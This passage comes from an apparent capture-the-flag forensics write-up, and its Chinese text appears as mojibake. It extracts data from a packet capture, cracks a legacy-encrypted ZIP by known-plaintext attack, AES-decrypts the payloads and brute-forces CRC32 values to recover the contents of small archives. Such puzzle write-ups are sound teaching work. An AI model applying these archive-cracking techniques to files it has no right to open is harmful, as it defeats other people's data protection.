class="built_in">len</span>(raw_data)&#125;</span> å­—èŠ‚&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;åŸå§‹æ•°æ® (hex): <span class="subst">&#123;raw_data.<span class="built_in">hex</span>()[:<span class="number">1000</span>]&#125;</span>...&quot;</span>)  <span class="comment"># åªæ˜¾ç¤ºå‰100ä¸ªå­—ç¬¦</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;ASCIIè¡¨ç¤º: <span class="subst">&#123;ascii_repr[:<span class="number">2000</span>]&#125;</span>...&quot;</span>)  <span class="comment"># åªæ˜¾ç¤ºå‰200ä¸ªå­—ç¬¦</span></span><br><span class="line">                </span><br><span class="line">                <span class="comment"># è¯¦ç»†åˆ†ææ•°æ®æ ¼å¼</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;\næ•°æ®æ ¼å¼åˆ†æ:&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;  æ•°æ®å­—èŠ‚æ•°: <span class="subst">&#123;<span class="built_in">len</span>(raw_data)&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;  å¯æ‰“å°ASCIIå­—ç¬¦æ•°: <span class="subst">&#123;<span class="built_in">sum</span>(<span class="number">1</span> <span class="keyword">for</span> c <span class="keyword">in</span> ascii_repr <span class="keyword">if</span> c != <span class="string">&#x27;.&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;  éæ‰“å°å­—ç¬¦æ•°: <span class="subst">&#123;<span class="built_in">sum</span>(<span class="number">1</span> <span class="keyword">for</span> c <span class="keyword">in</span> ascii_repr <span class="keyword">if</span> c == <span class="string">&#x27;.&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># å°è¯•æ£€æµ‹æ•°æ®ç±»å‹</span></span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(raw_data) &gt; <span class="number">0</span>:</span><br><span class="line">                    first_byte = raw_data[<span class="number">0</span>]</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;  ç¬¬ä¸€ä¸ªå­—èŠ‚: 0x<span class="subst">&#123;first_byte:02x&#125;</span> (<span class="subst">&#123;first_byte&#125;</span>)&quot;</span>)</span><br><span class="line">                    </span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;åˆ†æå¤±è´¥: <span class="subst">&#123;ascii_repr&#125;</span>&quot;</span>)</span><br><span class="line">                </span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;å¤„ç†PNG #<span class="subst">&#123;i&#125;</span>æ—¶å‡ºé”™: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>å¾—åˆ°çš„æ˜¯ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">True. Anyway, before I forget...how...s that side project you were working on? The one you wouldn...t shut up about months ago....</span><br><span class="line">Still alive... barely. Progress is slow, but steady. You know me...I don...t give up easily....</span><br><span class="line">Good. I hope it pays off one day....</span><br><span class="line">Thanks. Alright... I...m guessing you didn...t ping me just to chat?...</span><br><span class="line">Well, half of it was. It...s been a while. But yes...I do have something for you today. Before sending the core cipher, I...ll transmit an encrypted archive first. It contains a sample text and the decryption rules....</span><br><span class="line">Okay. What...s special about this sample text?...</span><br><span class="line">And... inside the sample text, I used my favorite Herobrine legend...you know the one I always bring up....</span><br><span class="line">Of course I know. The hidden original text from that weird old site, right?...</span><br><span class="line">What can I say...old habits die hard. Anyway, the important part: the sample packet and the core cipher are encrypted with the same password....</span><br><span class="line">Got it. So if I can decrypt the sample, the real one should be straightforward....</span><br><span class="line">Exactly. Send the sample when ready....</span><br><span class="line">I...m ready. Go ahead....</span><br><span class="line">UEsDBBQAAQAIABtFeFu1Ii0dcwAAAHwAAAAJAAAAcnVsZXMudHh07XuRBFDbojGKhAz59VaKEpwD6/rKaZnqUxf+NMH0rybWrAMPewZ/yGyLrMKQjNIcEbPAxjmP5oTh8fP77Vi1wnFwzN37BmrQ9SCkC27FC/xeqbgw/HWcDpgzsEoiNpqT9ZThrbAScyg5syfJmNactjelNVBLAwQUAAEACACGOXhbpdvG1ysBAAAVAgAACgAAAHNhbXBsZS50eHTA1fy4cMLZwZkTI1mEk88yOXy9rmbTbCNBQOo9hqKQPK6vjZVo9aCtTVflmkKYGV99+51qXbinmG7WGik5UvLJk9MKRosThBCDMHrmjibOCzjzNELwEgEyX8DjqJkSc8pIFwj+oRM3bb4i0GtRxbwqgsxCtgwiKdCVoXVdetN7RKLIQ7DD+Huv/ZptNdd0yRNHis9LEA3loB+IHZ+dK7IknqPh4lYF8JwAjx5/wwp0YAM6Bcec7uAvk6B5t1pEztm1rLl8TjniVz5/bBUTo1LjUXnar/pnm1NvE9EAuxz/s6b+O8/ew7/A4ItdNJGzDudh6YULfiV3pCTXFIbR4GCe4LwkohWZIlAjysA+zLRrgkTDoB10vWdNGdfoBAlLRoUdZ95mS7X5/bXV41BLAQI/ABQAAQAIABtFeFu1Ii0dcwAAAHwAAAAJACQAAAAAAAAAIAAAAAAAAABydWxlcy50eHQKACAAAAAAAAEAGABIv3f82lzcAQAAAAAAAAAAAAAAAAAAAABQSwECPwAUAAEACACGOXhbpdvG1ysBAAAVAgAACgAkAAAAAAAAACAAAACaAAAAc2FtcGxlLnR4dAoAIAAAAAAAAQAYAFP0sZjOXNwBAAAAAAAAAAAAAAAAAAAAAFBLBQYAAAAAAgACALcAAADtAQAAAAA=...</span><br><span class="line">got it. Decrypting... yeah, it works....</span><br><span class="line">Good. That means the channel is stable....</span><br><span class="line">Alright. Whenever you...re ready, send the real thing....</span><br><span class="line">The core cipher will be transmitted through our secret channel. You remember how to decrypt it, right?...</span><br><span class="line">Of course. I...ve got the procedure ready. Start when you...re ready....</span><br><span class="line">Done. Core cipher fully received. Integrity verified...no corruption....</span><br><span class="line">Same to you. And hey... nice talking again....</span><br><span class="line">Agreed. Take care....</span><br><span class="line">Good. Keep things quiet for the next few days....</span><br><span class="line">Yeah. Let...s not wait so long next time....</span><br><span class="line">You too....</span><br></pre></td></tr></table></figure><p>åˆ†æå¯¹è¯å†…å®¹ï¼š</p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202512021535967.png" alt="image-20251202153510814"></p><p>å¯ä»¥å¾—åˆ°ä»¥ä¸‹ä¿¡æ¯ï¼š</p><ol><li>ä¸­é—´è¿™ä¸€é•¿ä¸²base64æ˜¯ä¸ºå‘é€çš„æ ·æœ¬æ•°æ®åŒ…ï¼Œå’ŒçœŸæ­£çš„æ ¸å¿ƒæ•°æ®åŒ…ä½¿ç”¨çš„æ˜¯åŒä¸€ä¸ªå¯†ç </li><li>æ ·æœ¬æ•°æ®åŒ…é‡Œé¢çš„ç¤ºä¾‹æ–‡æœ¬å’ŒHerobrineæœ‰å…³</li><li>ä»32æµå¼€å§‹ï¼Œä¼ è¾“çœŸæ­£çš„åŠ å¯†æ ¸å¿ƒæ•°æ®åŒ…</li></ol><p>å¯¼å‡ºæ ·æœ¬ï¼š</p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202512021538469.png" alt="image-20251202153850361"></p><p>ä¼ ç»ŸåŠ å¯†çš„ä¸€ä¸ªå‹ç¼©åŒ…</p><p>æŸ¥æ‰¾æœ‰å…³Herobrineçš„å†…å®¹ï¼Œå¯ä»¥åœ¨mc wikiä¸­æ‰¾åˆ°å¯¹åº”çš„å†…å®¹ï¼š</p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202512021541302.png" alt="image-20251202154110148"></p><p>è¿™ä¾¿æ˜¯sample.txtçš„å†…å®¹</p><p>åŠ å¯†çš„æ ‡å¿—ä½ä¸º0x3Fï¼ŒçŒœæµ‹æ˜¯ç”¨7zå‹ç¼©ï¼Œè¿›è¡Œæ˜æ–‡æ”»å‡»å³å¯ç ´è§£å‹ç¼©åŒ…ï¼š</p><p>å†…éƒ¨å¯†é’¥ï¼š <code>b47e923c 5aeb49a7 a3cd7af0</code></p><p>è§£å‹å¾—åˆ°rules:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.you need to calc the md5 of port to decrypt the core data.</span><br><span class="line"></span><br><span class="line">2.The cipher I put in the zip, in segments, has been deflated.</span><br></pre></td></tr></table></figure><p>å¾—çŸ¥ç«¯å£å·çš„md5å³ä¸ºå¯†é’¥ï¼š</p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202512021552147.png" alt="image-20251202155249064"></p><p><code>7c365ebfc34003c40033cc47f6116dd1</code></p><p>AES-ECBè§£å¯†ï¼š</p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202512021556735.png" alt="image-20251202155637627"></p><p>å¾—åˆ°å‹ç¼©åŒ…ï¼š</p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202512021557818.png" alt="image-20251202155751716"></p><p>å¤§å°å¾ˆå°ï¼Œå¯ä»¥ä½¿ç”¨CRCçˆ†ç ´ï¼Œå†™è„šæœ¬æå–æ‰€æœ‰çš„æ•°æ®ï¼Œè¿›è¡Œçˆ†ç ´ï¼š</p><blockquote><p>ä»¥ä¸‹è„šæœ¬æ¥è‡ªLunaticå¸ˆå‚…ï¼š<a href="https://goodlunatic.github.io/posts/353513a/#%E9%A2%98%E7%9B%AE%E5%90%8D%E7%A7%B0-%E6%A0%87%E5%87%86%E7%9A%84%E7%BB%9D%E5%AF%86%E5%8E%8B%E7%BC%A9">https://goodlunatic.github.io/posts/353513a/#%E9%A2%98%E7%9B%AE%E5%90%8D%E7%A7%B0-%E6%A0%87%E5%87%86%E7%9A%84%E7%BB%9D%E5%AF%86%E5%8E%8B%E7%BC%A9</a></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(data).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_ecb_decrypt</span>(<span class="params">ciphertext, key</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(ciphertext) % <span class="number">16</span> != <span class="number">0</span>:</span><br><span class="line">        ciphertext = ciphertext.ljust((<span class="built_in">len</span>(ciphertext) + <span class="number">15</span>) // <span class="number">16</span> * <span class="number">16</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    decrypted = cipher.decrypt(ciphertext)</span><br><span class="line">    <span class="keyword">return</span> decrypted</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    file_path = <span class="string">&quot;capture.pcapng&quot;</span></span><br><span class="line">    crc_list = []</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> src_port <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30012</span>, <span class="number">30092</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] Processing source port: <span class="subst">&#123;src_port&#125;</span>&quot;</span>)</span><br><span class="line">        aes_key = md5(<span class="built_in">str</span>(src_port).encode())</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] aes_key: <span class="subst">&#123;aes_key&#125;</span>&quot;</span>)</span><br><span class="line">        filter_str = <span class="string">f&quot;tcp.srcport == <span class="subst">&#123;src_port&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">        command = [</span><br><span class="line">            <span class="string">&quot;tshark&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;-r&#x27;</span>, file_path,</span><br><span class="line">            <span class="string">&#x27;-T&#x27;</span>, <span class="string">&#x27;fields&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;-Y&#x27;</span>, filter_str,</span><br><span class="line">            <span class="string">&#x27;-e&#x27;</span>, <span class="string">&#x27;tcp.payload&#x27;</span></span><br><span class="line">        ]</span><br><span class="line">        <span class="comment"># print(f&quot;[+] cmd: &#123;command&#125;&quot;)</span></span><br><span class="line">        result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=<span class="literal">True</span>)   </span><br><span class="line">        output = result.stdout.split()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> output:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">            </span><br><span class="line">        hex_data = <span class="string">&quot;&quot;</span>.join(output)</span><br><span class="line">        <span class="comment"># print(f&quot;[+] hex_data: &#123;hex_data&#125;&quot;)</span></span><br><span class="line">        zip_data = aes_ecb_decrypt(<span class="built_in">bytes</span>.fromhex(hex_data), aes_key.encode())</span><br><span class="line">        <span class="comment"># print(zip_data)</span></span><br><span class="line"></span><br><span class="line">        zip_filename = <span class="string">f&quot;<span class="subst">&#123;src_port&#125;</span>.zip&quot;</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(zip_filename, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(zip_data)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> zipfile.ZipFile(zip_filename, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> zf:</span><br><span class="line">                file_list = zf.namelist()</span><br><span class="line">                <span class="keyword">if</span> file_list:</span><br><span class="line">                    target_file = file_list[<span class="number">0</span>]</span><br><span class="line">                    info = zf.getinfo(target_file)</span><br><span class="line">                    crc_list.append(<span class="built_in">hex</span>(info.CRC))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;\033[1;31m[-] Failed to process zip for port <span class="subst">&#123;src_port&#125;</span>\033[0m&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;CRC32 list: <span class="subst">&#123;crc_list&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>å¯ä»¥å¾—åˆ°80ä¸ªè¿™æ ·çš„zip</p><p>å†™è„šæœ¬æ‰¹é‡çˆ†ç ´crc:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CRC32Reverse</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, crc32, length, tbl=<span class="built_in">bytes</span>(<span class="params"><span class="built_in">range</span>(<span class="params"><span class="number">256</span></span>)</span>), poly=<span class="number">0xEDB88320</span>, accum=<span class="number">0</span></span>):</span><br><span class="line">        <span class="variable language_">self</span>.char_set = <span class="built_in">set</span>(tbl)  <span class="comment"># æ”¯æŒæ‰€æœ‰å­—èŠ‚</span></span><br><span class="line">        <span class="variable language_">self</span>.crc32 = crc32</span><br><span class="line">        <span class="variable language_">self</span>.length = length</span><br><span class="line">        <span class="variable language_">self</span>.poly = poly</span><br><span class="line">        <span class="variable language_">self</span>.accum = accum</span><br><span class="line">        <span class="variable language_">self</span>.table = []</span><br><span class="line">        <span class="variable language_">self</span>.table_reverse = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">init_tables</span>(<span class="params">self, poly, reverse=<span class="literal">True</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;æ„å»º CRC32 è¡¨åŠå…¶åå‘æŸ¥æ‰¾è¡¨&quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment"># CRC32 è¡¨æ„å»º</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">                <span class="keyword">if</span> i &amp; <span class="number">1</span>:</span><br><span class="line">                    i &gt;&gt;= <span class="number">1</span></span><br><span class="line">                    i ^= poly</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    i &gt;&gt;= <span class="number">1</span></span><br><span class="line">            <span class="variable language_">self</span>.table.append(i)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">assert</span> <span class="built_in">len</span>(<span class="variable language_">self</span>.table) == <span class="number">256</span>, <span class="string">&quot;CRC32 è¡¨çš„å¤§å°é”™è¯¯&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># æ„å»ºåå‘æŸ¥æ‰¾è¡¨</span></span><br><span class="line">        <span class="keyword">if</span> reverse:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">                found = [j <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>) <span class="keyword">if</span> <span class="variable language_">self</span>.table[j] &gt;&gt; <span class="number">24</span> == i]</span><br><span class="line">                <span class="variable language_">self</span>.table_reverse.append(<span class="built_in">tuple</span>(found))</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">assert</span> <span class="built_in">len</span>(<span class="variable language_">self</span>.table_reverse) == <span class="number">256</span>, <span class="string">&quot;åå‘æŸ¥æ‰¾è¡¨çš„å¤§å°é”™è¯¯&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">calc</span>(<span class="params">self, data, accum=<span class="number">0</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;è®¡ç®— CRC32 æ ¡éªŒå€¼&quot;&quot;&quot;</span></span><br><span class="line">        accum = ~accum</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> data:</span><br><span class="line">            accum = <span class="variable language_">self</span>.table[(accum ^ b) &amp; <span class="number">0xFF</span>] ^ ((accum &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0x00FFFFFF</span>)</span><br><span class="line">        accum = ~accum</span><br><span class="line">        <span class="keyword">return</span> accum &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">find_reverse</span>(<span class="params">self, desired, accum</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;æŸ¥æ‰¾åå‘å­—èŠ‚åºåˆ—&quot;&quot;&quot;</span></span><br><span class="line">        solutions = <span class="built_in">set</span>()</span><br><span class="line">        accum = ~accum</span><br><span class="line">        stack = [(~desired,)]</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span> stack:</span><br><span class="line">            node = stack.pop()</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="variable language_">self</span>.table_reverse[(node[<span class="number">0</span>] &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span>]:</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(node) == <span class="number">4</span>:</span><br><span class="line">                    a = accum</span><br><span class="line">                    data = []</span><br><span class="line">                    node = node[<span class="number">1</span>:] + (j,)</span><br><span class="line">                    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">                        data.append((a ^ node[i]) &amp; <span class="number">0xFF</span>)</span><br><span class="line">                        a &gt;&gt;= <span class="number">8</span></span><br><span class="line">                        a ^= <span class="variable language_">self</span>.table[node[i]]</span><br><span class="line">                    solutions.add(<span class="built_in">tuple</span>(data))</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    stack.append(((node[<span class="number">0</span>] ^ <span class="variable language_">self</span>.table[j]) &lt;&lt; <span class="number">8</span>,) + node[<span class="number">1</span>:] + (j,))</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> solutions</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">dfs</span>(<span class="params">self, length, outlist=[<span class="string">b&#x27;&#x27;</span>]</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;æ·±åº¦ä¼˜å…ˆæœç´¢ç”Ÿæˆå­—èŠ‚åºåˆ—&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> length == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> outlist</span><br><span class="line">        tmp_list = [item + <span class="built_in">bytes</span>([x]) <span class="keyword">for</span> item <span class="keyword">in</span> outlist <span class="keyword">for</span> x <span class="keyword">in</span> <span class="variable language_">self</span>.char_set]</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.dfs(length - <span class="number">1</span>, tmp_list)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run_reverse</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;æ‰§è¡Œ CRC32 åå‘æŸ¥æ‰¾&quot;&quot;&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.init_tables(<span class="variable language_">self</span>.poly)</span><br><span class="line"></span><br><span class="line">        desired = <span class="variable language_">self</span>.crc32</span><br><span class="line">        accum = <span class="variable language_">self</span>.accum</span><br><span class="line">        result_list = []</span><br><span class="line"></span><br><span class="line">        <span class="comment"># å¤„ç†è‡³å°‘ä¸º 4 å­—èŠ‚çš„æƒ…å†µ</span></span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.length &gt;= <span class="number">4</span>:</span><br><span class="line">            patches = <span class="variable language_">self</span>.find_reverse(desired, accum)</span><br><span class="line">            <span class="keyword">for</span> patch <span class="keyword">in</span> patches:</span><br><span class="line">                checksum = <span class="variable language_">self</span>.calc(patch, accum)</span><br><span class="line">                <span class="comment"># print(f&quot;verification checksum: 0x&#123;checksum:08x&#125; (&#123;&#x27;OK&#x27; if checksum == desired else &#x27;ERROR&#x27;&#125;)&quot;)</span></span><br><span class="line">            <span class="keyword">for</span> item <span class="keyword">in</span> <span class="variable language_">self</span>.dfs(<span class="variable language_">self</span>.length - <span class="number">4</span>):</span><br><span class="line">                patch = <span class="built_in">list</span>(item)</span><br><span class="line">                patches = <span class="variable language_">self</span>.find_reverse(desired, <span class="variable language_">self</span>.calc(patch, accum))</span><br><span class="line">                <span class="keyword">for</span> last_4_bytes <span class="keyword">in</span> patches:</span><br><span class="line">                    patch.extend(last_4_bytes)</span><br><span class="line">                    checksum = <span class="variable language_">self</span>.calc(patch, accum)</span><br><span class="line">                    <span class="keyword">if</span> checksum == desired:</span><br><span class="line">                        result_list.append(<span class="built_in">bytes</span>(patch))  <span class="comment"># æ·»åŠ ç¬¦åˆæ¡ä»¶çš„å­—èŠ‚åºåˆ—</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">for</span> item <span class="keyword">in</span> <span class="variable language_">self</span>.dfs(<span class="variable language_">self</span>.length):</span><br><span class="line">                <span class="keyword">if</span> <span class="variable language_">self</span>.calc(item) == desired:</span><br><span class="line">                    result_list.append(<span class="built_in">bytes</span>(item))  <span class="comment"># æ·»åŠ ç¬¦åˆæ¡ä»¶çš„å­—èŠ‚åºåˆ—</span></span><br><span class="line">        <span class="keyword">return</span> result_list</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crc32_reverse</span>(<span class="params">crc32, length, char_set=<span class="built_in">bytes</span>(<span class="params"><span class="built_in">range</span>(<span class="params"><span class="number">256</span></span>)</span>), poly=<span class="number">0xEDB88320</span>, accum=<span class="number">0</span></span>):</span><br><span class="line">    obj = CRC32Reverse(crc32, length, char_set, poly, accum)</span><br><span class="line">    <span class="keyword">return</span> obj.run_reverse()  <span class="comment"># è¿”å›æ‰€æœ‰ç»“æœ</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crc32</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">return</span> binascii.crc32(s) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    crc_values  =[<span class="number">0xcf60023f</span>, <span class="number">0x61d8a4f3</span>, <span class="number">0xb15f099f</span>, <span class="number">0xb93935f3</span>, <span class="number">0x56263d91</span>, <span class="number">0x7c9a17</span>, <span class="number">0x324af895</span>, <span class="number">0x64105f13</span>, <span 